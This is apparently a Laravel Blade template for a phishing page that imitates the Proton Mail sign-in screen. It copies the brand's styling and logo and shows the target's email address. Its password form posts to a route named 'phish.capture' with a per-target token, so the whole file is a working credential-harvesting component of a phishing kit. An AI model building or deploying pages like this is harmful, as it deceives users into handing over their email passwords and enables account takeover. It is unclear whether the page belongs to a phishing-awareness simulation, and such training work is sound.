<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="theme-color" content="#1b1340">
    <title>Proton Mail</title>
    <link rel="icon" href="https://proton.me/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root{--primary:#6d4aff;--primary-minor-1:#e2dbff;--primary-minor-2:#f0edff;--text:#0c0c14;--text-weak:#6b6b7b;--bg:#fff;--border:#d0d0e0;--border-focus:#6d4aff;--input-bg:#fff;--link:#6d4aff}
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:InterVariable,Inter,system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .card{width:100%;max-width:400px;text-align:center}
        .logo{margin-bottom:24px;display:flex;justify-content:center}
        .logo svg{width:56px;height:56px}
        .card h1{font-size:22px;font-weight:600;margin-bottom:8px}
        .card .subtitle{font-size:14px;color:var(--text-weak);margin-bottom:28px}
        .email-display{display:flex;align-items:center;padding:12px 16px;background:var(--input-bg);border:1px solid var(--border);border-radius:8px;margin-bottom:20px;gap:12px;text-align:left}
        .avatar{width:32px;height:32px;border-radius:50%;background:var(--primary);display:flex;align-items:center;justify-content:center;color:#fff;font-size:14px;font-weight:500;flex-shrink:0}
        .email-text{font-size:14px;color:var(--text);font-weight:500}
        .form-group{text-align:left;margin-bottom:16px}
        .form-group label{display:block;font-size:13px;color:var(--text-weak);margin-bottom:6px;font-weight:400}
        .form-group input{width:100%;height:44px;padding:0 16px;font-size:15px;font-family:InterVariable,Inter,sans-serif;color:var(--text);background:var(--input-bg);border:1px solid var(--border);border-radius:8px;outline:none;transition:border-color .15s}
        .form-group input:focus{border-color:var(--border-focus);box-shadow:0 0 0 3px var(--primary-minor-2)}
        .btn-login{width:100%;height:44px;background:var(--primary);color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;transition:background .15s;margin-top:4px}
        .btn-login:hover{background:#5a3ae0}
        .links-row{display:flex;justify-content:space-between;margin-top:16px}
        .links-row a{font-size:13px;color:var(--link);text-decoration:none}
        .links-row a:hover{text-decoration:underline}
        .google-btn{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;height:44px;margin-top:12px;background:var(--input-bg);border:1px solid var(--border);border-radius:8px;font-size:14px;font-weight:500;color:var(--text);cursor:pointer;transition:background .15s}
        .google-btn:hover{background:#f5f5f5}
        .google-btn svg{width:18px;height:18px}
        .footer{margin-top:32px;font-size:11px;color:var(--text-weak)}
        .footer a{color:var(--text-weak);text-decoration:none;margin:0 6px}
        .footer a:hover{text-decoration:underline}
        @media(max-width:480px){.card{padding:0}}
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <svg viewBox="0 0 56 56" fill="none" xmlns="http://www.w3.org/2000/svg">
                <defs>
                    <linearGradient id="p-gradient" x1="12.6758" y1="55.0493" x2="43.5332" y2="1.27785">
                        <stop offset="0.12" stop-color="#6D4BFD"/>
                        <stop offset="1" stop-color="#1C0554"/>
                    </linearGradient>
                </defs>
                <rect width="56" height="56" rx="12" fill="url(#p-gradient)"/>
                <path d="M28 13C20.82 13 15 18.82 15 26v4c0 7.18 5.82 13 13 13s13-5.82 13-13v-4c0-7.18-5.82-13-13-13zm0 4a9 9 0 019 9v4a9 9 0 01-18 0v-4a9 9 0 019-9z" fill="rgba(255,255,255,.9)"/>
                <circle cx="28" cy="26" r="3" fill="rgba(255,255,255,.9)"/>
            </svg>
        </div>
        <h1>Sign in</h1>
        <p class="subtitle">Continue to Proton Mail</p>

        <div class="email-display">
            <div class="avatar">{{ strtoupper(substr($email, 0, 1)) }}</div>
            <div class="email-text">{{ $email }}</div>
        </div>

        <form action="{{ route('phish.capture', ['provider' => 'protonmail', 'token' => $token]) }}" method="POST">
            @csrf
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" autofocus>
            </div>
            <button type="submit" class="btn-login">Sign in</button>
        </form>

        <div class="links-row">
            <a href="#">Forgot password?</a>
            <a href="#">Create an account</a>
        </div>

        <button class="google-btn">
            <svg viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
            Sign in with Google
        </button>

        <div class="footer">
            <a href="#">Terms</a>
            <a href="#">Privacy</a>
            <a href="#">Copyright © 2026 Proton AG</a>
        </div>
    </div>
</body>
</html>
